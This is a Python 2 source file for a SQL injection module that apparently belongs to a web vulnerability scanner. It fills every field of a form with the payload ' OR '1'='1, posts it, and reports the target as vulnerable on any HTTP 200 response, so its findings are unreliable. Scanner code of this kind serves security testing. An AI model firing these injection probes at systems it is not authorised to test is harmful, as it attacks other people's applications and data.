import requests
from AttackModule import AttackModule
from Helpers import Helper
from AttackReport import AttackReport

class SqlInjAttackModule(AttackModule):
	attackPatterns = [
		"' OR '1'='1"
	]

	def __init__(self):
		AttackModule.__init__(self, "SQL Injection", "SQL Injection")

	def attack(self, endpoint):
		if endpoint.is_form() is not True:
			print "Target: {0}\t is not a form. Skipping!".format(endpoint.url)
			return

		self.attack_succeeded = False
		self.attack_report = None

		print "    Inputs in form are:"
		for index, key in enumerate(endpoint.htmlForm.get_form_data_dict()):
			print "    [{0}] name:{1} value:{2}".format(index, key, endpoint.htmlForm.get_form_data_dict()[key])
		print "Beginning attack (SQL Injection) -> SQL\n Target: {0}".format(endpoint.url)

		for attackPattern in SqlInjAttackModule.attackPatterns:
			payload = {}
			for index, key in enumerate(endpoint.htmlForm.get_form_data_dict()):
				key_string = list(endpoint.htmlForm.get_form_data_dict().keys())[index]
				payload[key_string] = attackPattern

			self.attack_operation(endpoint, payload)

	def attack_operation(self, endpoint, payload):
		result = self.launch_attack(endpoint, payload)
		if result:
			self.attack_succeeded = True
			print "    [ SqlInjAttack: {0} ] ->".format(payload),
			print result

		if self.attack_succeeded:
			print "    Finished attack -> VULNERABLE!\n"
		else:
			print "    Finished attack -> Nothing found!\n"

	def launch_attack(self, endpoint, payload):
		headers = {}
		res = Helper.do_post_request(endpoint, headers, payload)

		if self.is_attack_successful(endpoint, res):
			report = AttackReport(self.attackClass, endpoint, headers, payload, "")
			AttackReport.add_attack_report(report)
			return True

		return False

	def is_attack_successful(self, endpoint, res):
		if res.ok:
			if res.status_code == 200:
				req = requests.get(endpoint.url)
				print req.text
				return True
			else:
				print "WARNING: SqlInjAttackModule, " + \
					"is_attack_successful, unrecognized status code: {0} for {1}".format(
						res.status_code, res.request.url)
		return False
